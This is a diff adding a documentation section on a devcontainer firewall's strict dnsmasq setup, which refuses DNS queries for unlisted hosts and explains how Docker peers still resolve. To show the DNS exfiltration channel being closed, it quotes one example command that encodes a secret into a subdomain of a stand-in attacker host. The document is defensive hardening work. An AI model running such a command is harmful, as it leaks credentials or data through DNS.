@@ -67,6 +67,30 @@ Pipeline:
 
 **`runtime._overrides_applied`** in compiled YAML is the machine-readable audit of every local override (action ∈ `{disable, disable-nop, redefine, merge}`).
 
+### Strict DNS — no catch-all upstream
+
+`dnsmasq.conf` (baked at `/etc/devcontainer-firewall/dnsmasq.conf`) has
+**no default `server=` line**. Combined with `no-resolv` + `no-hosts`,
+any query for a host not listed in the generated
+`dnsmasq-domains.conf` returns `status: REFUSED` — the query is never
+forwarded to Docker DNS / host DNS / public DNS. This closes the DNS
+exfil channel (a `dig $(base64 secret).attacker.com @127.0.0.53` cannot
+leak the encoded payload upstream).
+
+Sibling Docker peers that still need to resolve are handled by
+`init-firewall.sh` injecting per-host overrides into the generated conf:
+
+- **claude-bridge** — unconditional override (`server=/claude-bridge/
+  127.0.0.11`), since claude-bridge is always declared in docker-compose
+  and always listed in baked `domains.txt`. Docker's embedded resolver
+  (127.0.0.11) resolves the service from the compose graph.
+- **host.docker.internal** — via the ollama block's `host-record=
+  host.docker.internal,$HOST_DOCKER_IP` directive (resolved at boot
+  through Docker's resolver, then injected with `local-ttl=3600`).
+- **Generic loop over `direct-tcp-allow.txt`** — every other `host:port`
+  entry gets a `server=/<host>/127.0.0.11` line emitted at boot, scaled
+  by `claude-switch` for the active mode.
+
 ### compile-policy.py modes
 
 - `--parse-only --json <files>` — emit `{entries, errors}` for tests (no yaml dependency)
